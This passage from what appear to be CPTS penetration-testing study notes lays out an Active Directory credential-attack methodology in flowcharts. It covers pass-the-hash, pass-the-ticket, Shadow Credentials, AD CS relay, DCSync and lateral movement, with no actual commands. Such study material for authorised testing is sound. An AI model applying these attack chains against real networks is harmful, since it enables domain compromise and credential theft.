3️⃣ FIND VALID ACCOUNTS
   ↓
4️⃣ HUNT CREDENTIALS
   ↓
5️⃣ IDENTIFY CREDENTIAL TYPE
   ↓
6️⃣ CHOOSE ATTACK
   ↓
7️⃣ AUTHENTICATE
   ↓
8️⃣ ENUMERATE NEW ACCESS
   ↓
9️⃣ FIND PRIVILEGE PATH
   ↓
🔟 EXTRACT HIGHER-VALUE CREDENTIALS
   ↓
🏆 REPEAT
```

### Credential decision:

```text
PASSWORD?
   → Authenticate / Spray / Stuff / Crack

NTLM HASH?
   → PtH / Crack

KERBEROS TICKET?
   → PtT

CERTIFICATE?
   → PKINIT / PtC

SAM + SYSTEM?
   → Extract local hashes

NTDS.dit?
   → Extract domain hashes

LSASS?
   → Parse credential material

SMB?
   → Search shares/files

PCAP?
   → Search authentication traffic

AD CS?
   → Enumerate certificate attack paths

msDS-KeyCredentialLink WRITE?
   → Shadow Credentials

Replication Rights?
   → DCSync
```

---

# 🏆 43. Final CPTS Takeaways

> [!success]  
> **The core skill is not memorizing 100 commands.**
> 
> It is recognizing the relationship between:
> 
> **Credential → Authentication Protocol → Technique → Identity → Access → Next Credential**

The highest-value chains to know cold are:

```text
🔑 Password
    ↓
Authentication
```

```text
🔑 NTLM Hash
    ↓
Pass-the-Hash
```

```text
🎫 Kerberos Ticket
    ↓
Pass-the-Ticket
```

```text
📜 Certificate
    ↓
PKINIT
    ↓
TGT
```

```text
🏢 AD CS / ESC8
    ↓
NTLM Relay
    ↓
Certificate
    ↓
PKINIT
    ↓
TGT
```

```text
👤 msDS-KeyCredentialLink
    ↓
Shadow Credentials
    ↓
Certificate
    ↓
PKINIT
    ↓
Victim TGT
```

```text
🎫 High-privileged Kerberos Identity
    ↓
DCSync
    ↓
NTLM Hash
    ↓
Pass-the-Hash
    ↓
👑 Administrator
```

> [!important]  
> **The ultimate methodology:**
> 
> ```text
> 🔎 ENUMERATE
>      ↓
> 🕵️ HUNT
>      ↓
> 🔑 IDENTIFY CREDENTIAL
>      ↓
> ⚔️ SELECT TECHNIQUE
>      ↓
> 🔓 AUTHENTICATE
>      ↓
> 🧭 ENUMERATE AGAIN
>      ↓
> 🧗 ESCALATE
>      ↓
> 🔄 PIVOT / LATERAL MOVE
>      ↓
> 👑 REPEAT UNTIL OBJECTIVE
> ```
> 
> **Never treat an attack as an isolated trick.**  
> Every credential you obtain should make you ask:
> 
> **“What can this credential authenticate to, and what can that identity access?”**